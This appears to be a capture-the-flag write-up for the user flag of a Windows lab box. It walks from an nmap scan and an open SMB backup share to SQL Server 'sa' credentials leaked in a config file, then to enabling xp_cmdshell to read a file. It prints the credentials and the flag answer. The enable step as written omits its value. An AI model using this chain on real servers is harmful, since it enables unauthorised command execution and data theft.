# PotatoHead (user)
Author: LOLASL

## Description
```
The flag is located in `C:\Users\Public\flag.txt`
```

# Enumeration

## Ports

Start with an nmap scan of the target machine.

```
Nmap scan report for ip-10-128-8-167.eu-west-1.compute.internal (10.128.8.167)
Host is up (0.032s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```

Take a look at the SMB shares.

Find a share called 'Backup' that is not password protected and use it to download an entire backup of the website that is hosted on port 80.

Inside the application.json file are some SQL Server credentials.

```
{
  "ConnectionStrings": {
    "DefaultConnection": "Server=localhost;Database=BeachClubDb;User Id=sa;Password=RLFXT0PpAtk2IAyB1xKnuaFaqDX;TrustServerCertificate=True;"
  },
  "Logging": {
    "LogLevel": {
      "Default": "Information",
      "Microsoft.AspNetCore": "Warning"
    }
  },
  "AllowedHosts": "*"
}
```

## SQL Server

Use these credentials to connect to the SQL Server.

### User Flag

The following SQL Query commands were enough to read the contents of the user flag found in `C:\Users\Public\flag.txt`.

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell';
RECONFIGURE

EXEC xp_cmdshell 'type C:\Users\Public\flag.txt';
```

The result is the EPT flag for the User.

`EPT{sei_sandnes_e_stabilt!}`
